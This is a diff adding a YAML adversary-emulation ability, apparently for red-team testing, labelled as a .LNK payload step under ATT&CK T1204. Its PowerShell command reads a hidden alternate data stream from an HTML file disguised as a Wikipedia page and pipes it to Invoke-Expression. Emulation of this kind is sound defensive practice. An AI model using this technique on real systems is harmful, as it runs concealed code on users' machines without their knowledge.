@@ -1,0 +1,23 @@
+---
+  - id: e506f811-884d-4992-aacb-514b33a0324f
+    name: 11.A - Click .LNK payload
+    description: Execute PowerShell collection command to collect and compress files of specific extensions.
+    tactic: execution
+    technique:
+      attack_id: T1204
+      name: Execution - User Execution via .lnk
+    platforms:
+      windows:
+        psh,pwsh:
+          command: |
+            Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
+
+            if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
+              Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+              Write-Host "Removed old kxwn.lock file";
+            }
+
+            powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
+          cleanup: |
+            Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+
